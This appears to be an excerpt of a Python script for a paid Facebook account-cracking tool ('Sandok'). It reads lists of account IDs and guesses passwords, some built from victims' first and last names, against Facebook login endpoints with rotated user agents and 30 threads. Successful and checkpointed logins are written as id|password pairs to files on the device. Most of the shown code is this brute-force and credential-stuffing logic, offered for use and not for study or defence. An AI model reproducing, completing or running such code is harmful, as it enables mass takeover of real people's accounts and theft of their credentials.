...
os.system('clear')
logo = ("""
\033[1;91m   _____ ___    _   ______  ____  __ __
\033[1;31m/ ___//   |  / | / / __ \/ __ \/ //_/
\033[1;32m\__ \/ /| | /  |/ / / / / / / / ,<   
\033[1;35m___/ / ___ |/ /|  / /_/ / /_/ / /| |  
\033[1;39m/____/_/  |_/_/ |_/_____/\____/_ |_|  \033[1;31m                                    
 ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 ┃  FACEBOOK       : JARUL ABING
 ┃  GITHUB         : UNKNOWN
 ┃  TYPE           : PAID/PERSONAL
 ┃  VERSION        : 0.00001    \033[1;32m
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
def linex():
        print('\033[1;91m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
def clear():
...
tokenku=[]
# LOGIN_KEY
correct_username = 'jarulpogi'
key = 'true'

while key == 'true':
    username = input('\33[0;97m[Jarul]\33[1;96m~~~~~>\33[1;92mPLEASE ENTER KEY\33[1;91m: ')

    if username == correct_username:
        print('\33[1;37m-----------------------------------------------\33[0;97m[•]\33[1;32m WELCOME YES IM LITERALLY GWAPO TOOL ')
        time.sleep(1)
...
def Spy():
	...
	if me in ["1", "01","11","A","a"]:
		clear()
		file = input(f' [?] Put file path\033[1;91m: ')
		try:
			fo = open(file,'r').read().splitlines()
		except FileNotFoundError:
			print(f' \033[1;32m[!] File location not found ')
			exit()
		os.system('clear')
		print(logo)
		print(f' [1] Method 1 \n [2] Method 2 \n [3] Method 3 \n [4] Method 4')
		...
		cx=input(f'\n [?] Do you want show to dead account? (y/n): ')
		...
		with tred(max_workers=30) as crack_submit:
			...
			print(f"\033[1;37m Use airplane mode for speed up\033[1;37m")
			linex()
			for user in fo:
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;37m [Sandok] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Shahin:
                                ...
                                print(f'\r\r\033[1;32m [Sandok-BUHAY] %s | %s'%(ids,pas))
                                open(f'/sdcard/Sandok-BUHAY.txt', 'a').write(ids+'|'+pas+'\n')
                                #cek_apk(session,coki)
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Shahin:
                                if 'y' in pcp:
                                        print(f'\r\r\x1b[38;5;126m [Sandok-PATAY] '+ids+' | '+pas+'\033[1;97m')
                                        open(f'/sdcard/Sandok-PATAY.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def ffb1(ids,names,passlist):
        ...
        try:
                ...
                for fikr in passlist:
                        pas = fikr.replace(f'First',first).replace(f'Last',last).replace(f'first',ps).replace(f'last',ps2)
                        ua=random.choice(ugen)
                        headers_freefb = {'authority': 'mbasic.facebook.com',  'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print(f'\r\r\033[1;32m [Sandok-BUHAY] '+ids+' | '+pas+'\033[1;97m')
                                        open(f'/sdcard/Sandok-BUHAY.txt','a').write(ids+'|'+pas+'\n')
                                        #cek_apk(session,coki)
                                        oks.append(ids)
                                        break
...
def bd():
                ...
                print(' Total BUHAT/PATAY: '+str(len(oks))+'/'+str(len(cps)))
...
def gml():
                ...
                linex()
                print(' The process has completed')
                print(' Total BUHAY/PATAY: '+str(len(oks))+'/'+str(len(cps)))
...
def rcrack_free(idf,pwv):
	...
	#		print(idf+'|'+ps)
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\n')
				print('\033[1;92m[Sandok-BUHAY] '+idf+' | '+ps+'\033[0;97m')
				cek_apk(coki)
				...
				cid = coki[141:156]
				print('\n')
				print('\033[1;91m[Sandok-PATAY] '+idf+' | '+ps+'\033[0;97m')
